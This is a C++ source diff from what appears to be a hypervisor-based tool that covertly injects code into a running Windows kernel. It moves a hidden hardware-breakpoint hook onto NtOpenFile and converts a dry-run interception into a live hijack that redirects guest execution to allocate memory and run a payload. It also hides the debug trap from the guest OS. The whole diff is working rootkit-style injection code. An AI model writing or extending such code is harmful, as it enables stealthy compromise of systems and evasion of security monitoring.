@@ -14,8 +14,8 @@ namespace
     // which is included via arch.h
 
 
-    // Helper to resolve KeSetEvent dynamically
-    uint64_t resolve_ke_set_event()
+    // Helper to resolve NtOpenFile dynamically
+    uint64_t resolve_target_function()
     {
         if (g_runtime_context.ntoskrnl_base == 0)
         {
@@ -27,7 +27,7 @@ namespace
         g_runtime_context.loader_ctx.guest_cr3 = arch::get_guest_cr3();
         
         // Use loader module to resolve export
-        return loader::get_kernel_export(&g_runtime_context.loader_ctx, g_runtime_context.ntoskrnl_base, "KeSetEvent");
+        return loader::get_kernel_export(&g_runtime_context.loader_ctx, g_runtime_context.ntoskrnl_base, "NtOpenFile");
     }
 
     // Helper to configure DR7 for injection interception
@@ -38,10 +38,10 @@ namespace
             return;
         }
 
-        // 1. Set DR0 to the target address (KeSetEvent)
+        // 1. Set DR0 to the target address (NtOpenFile)
         // Note: DR0-DR3 are usually not saved/restored by VMX, so writing to host DR0
         // effectively sets it for the guest (until guest context switch overwrites it).
-        // Since KeSetEvent is high-frequency, we hope to catch it before context switch.
+        // Since NtOpenFile is high-frequency enough, we hope to catch it before context switch.
         __writedr(0, target_address);
 
         // 2. Compute DR7 value based on current Guest DR7 (preserve other bits if possible)
@@ -110,10 +110,10 @@ bool process_injection_state_tick(uint64_t guest_rip, trap_frame_t* trap_frame)
             // Transition Trigger: Must be in Kernel Mode (CPL=0) to resolve exports safely
             if (arch::get_guest_cpl() == 0)
             {
-                const uint64_t ke_set_event = resolve_ke_set_event();
-                if (ke_set_event != 0)
+                const uint64_t target_func = resolve_target_function();
+                if (target_func != 0)
                 {
-                    ctx.ke_set_event_address.store(ke_set_event);
+                    ctx.target_address.store(target_func);
 
                     // 1. Set Global NMI Ready Bitmap (Mark all cores as needing config)
                     interrupts::set_all_nmi_ready(&g_runtime_context.interrupts_ctx);
@@ -125,8 +125,8 @@ bool process_injection_state_tick(uint64_t guest_rip, trap_frame_t* trap_frame)
                     ctx.stage.store(1);
 
                     logs::print(&g_runtime_context.log_ctx, 
-                        "[Inject] Warm-up complete. KeSetEvent found at %p. Broadcast NMI sent. Entering Stage 1.\n", 
-                        ke_set_event);
+                        "[Inject] Warm-up complete. Target found at %p. Broadcast NMI sent. Entering Stage 1.\n", 
+                        target_func);
                 }
             }
         }
@@ -144,10 +144,10 @@ bool process_injection_state_tick(uint64_t guest_rip, trap_frame_t* trap_frame)
         
         // Check DR0
         uint64_t current_dr0 = __readdr(0);
-        if (current_dr0 != ctx.ke_set_event_address.load())
+        if (current_dr0 != ctx.target_address.load())
         {
             logs::print(&g_runtime_context.log_ctx, "[Inject] Core %d Need Config: DR0 mismatch. Current=%p Target=%p\n",
-                apic_t::current_apic_id(), current_dr0, ctx.ke_set_event_address.load());
+                apic_t::current_apic_id(), current_dr0, ctx.target_address.load());
             need_config = true;
         }
         else
@@ -165,29 +165,13 @@ bool process_injection_state_tick(uint64_t guest_rip, trap_frame_t* trap_frame)
 
         if (need_config)
         {
-            configure_injection_dr7(ctx.ke_set_event_address.load());
+            configure_injection_dr7(ctx.target_address.load());
         }
 
         // Clear NMI ready bit if set (cleanup)
         if (interrupts::is_nmi_ready(&g_runtime_context.interrupts_ctx, apic_t::current_apic_id()))
         {
             interrupts::clear_nmi_ready(&g_runtime_context.interrupts_ctx, apic_t::current_apic_id());
-        }
-    }
-
-    // 2. Magic Trap Logic (Legacy/Payload Return Trigger)
-    // This handles the return from the hijacked allocator (Stage 2 -> Stage 3 transition in old logic)
-    if (guest_rip == injection_ctx_t::MAGIC_TRAP_RIP)
-    {
-        if (loader::harvest_allocation_result(&g_runtime_context.loader_ctx, trap_frame))
-        {
-            loader::execute_payload_hijack(&g_runtime_context.loader_ctx, trap_frame);
-            
-            // Clear DR7 on this core as we are done
-            clear_injection_dr7();
-            
-            ctx.stage.store(2); // Done (Interception Complete)
-            return true; // Handled
         }
     }
 
@@ -202,9 +186,8 @@ bool handle_injection_db_exit(trap_frame_t* trap_frame)
     uint64_t exit_qualification = 0;
     __vmx_vmread(VMCS_EXIT_QUALIFICATION, &exit_qualification);
 
-    // DEBUG LOG
-    logs::print(&g_runtime_context.log_ctx, "[Inject] #DB Exit on Core %d. Qual=%p RIP=%p Target=%p\n",
-        apic_t::current_apic_id(), exit_qualification, arch::get_guest_rip(), ctx.ke_set_event_address.load());
+    // DEBUG LOG REMOVED to prevent spam/deadlock
+    // logs::print(...)
 
     // Check B0 (Break 0) to verify it's our breakpoint
     if (!(exit_qualification & 1))
@@ -215,10 +198,30 @@ bool handle_injection_db_exit(trap_frame_t* trap_frame)
     }
 
     // Verify RIP matches target
-    if (arch::get_guest_rip() != ctx.ke_set_event_address.load())
+    if (arch::get_guest_rip() != ctx.target_address.load())
     {
         return false;
     }
+
+    // IRQL CHECK:
+    // MmAllocateIndependentPagesEx requires IRQL <= APC_LEVEL (0 or 1).
+    // NtOpenFile is guaranteed to be PASSIVE_LEVEL (0).
+    // So theoretically we are safe. However, as a sanity check, we still verify we are not high.
+    
+    const uint64_t rflags = arch::get_guest_rflags();
+    if (!(rflags & 0x200)) // IF = 0
+    {
+        // Interrupts disabled -> High IRQL. Skip.
+        logs::print(&g_runtime_context.log_ctx, "[Inject] Skip Core %d: IF=0 (Interrupts Disabled at NtOpenFile)\n", apic_t::current_apic_id());
+        
+        arch::set_guest_rflags(rflags | (1ULL << 16)); // RF=1
+        return true; 
+    }
+    
+    // CR8 Check Removed:
+    // NtOpenFile is guaranteed to run at PASSIVE_LEVEL (IRQL 0).
+    // Reading GUEST_CR8 from VMCS is unreliable if "TPR Shadow" is not enabled (returns garbage).
+    // Since we target a safe syscall function, we rely on the target safety and IF flag.
 
     // Clear DR6 B0 Status (Logic only, we don't write back to Exit Qual)
     // Note: To strictly hide it from guest, we should clear GUEST_DR6 in VMCS if it exists,
@@ -227,17 +230,42 @@ bool handle_injection_db_exit(trap_frame_t* trap_frame)
     // So the guest never sees the #DB or the DR6 status.
     // We just resume execution.
 
-    // If active stage (1), log success and finish
-    // Use CAS or just check to avoid spamming logs if multiple cores hit simultaneously
+    // If active stage (1), attempt to claim the hijack task
+    // Use CAS to ensure ONLY ONE core performs the hijack
     uint32_t expected = 1;
     if (ctx.stage.compare_exchange_strong(expected, 2))
     {
-        logs::print(&g_runtime_context.log_ctx, "[Inject] SUCCESS: Intercepted KeSetEvent on Core %d! (Dry Run)\n", apic_t::current_apic_id());
+        // Populate Trap Frame with VMCS Guest State
+        // VMExit handler assembly does not populate RSP/RIP from VMCS automatically.
+        trap_frame->rsp = arch::get_guest_rsp();
+        // trap_frame->rip is not available in standard trap_frame_t, so we don't save it here.
+        // It will be saved separately in prepare_allocation_hijack if needed.
+
+        logs::print(&g_runtime_context.log_ctx, "[Inject] Intercepted NtOpenFile on Core %d! Starting Hijack...\n", apic_t::current_apic_id());
+        
+        // Perform the Hijack
+        if (loader::prepare_allocation_hijack(&g_runtime_context.loader_ctx, trap_frame))
+        {
+             // Success: Stage is now 2 (Wait for Magic Trap)
+        }
+        else
+        {
+             // Failed: Log and revert to retry (or handle as fatal)
+             logs::print(&g_runtime_context.log_ctx, "[Inject] FATAL: Hijack preparation failed! Aborting injection.\n");
+             ctx.stage.store(3); // Stage 3 = Done/Failed. Do not retry to avoid infinite loop.
+        }
     }
 
-    // Always cleanup and resume
+    // Always cleanup DR7 to prevent further #DB exits on this core
     clear_injection_dr7();
-    arch::set_guest_rflags(arch::get_guest_rflags() | (1ULL << 16)); // Set RF (Resume Flag) to suppress #DB on the same instruction
+    
+    // If we didn't hijack (stage was not 1, or CAS failed), we just resume original execution.
+    // If we DID hijack, prepare_allocation_hijack updated RIP/RSP, so we resume to new target.
+    
+    // Resume Flag (RF) handling:
+    // If we modified RIP (Hijack case), we don't strictly need RF as we are at a new instruction.
+    // If we resume original (Non-Hijack case), we need RF to step over the breakpoint instruction.
+    arch::set_guest_rflags(arch::get_guest_rflags() | (1ULL << 16)); 
 
     return true; // Handled (Resumed)
 }
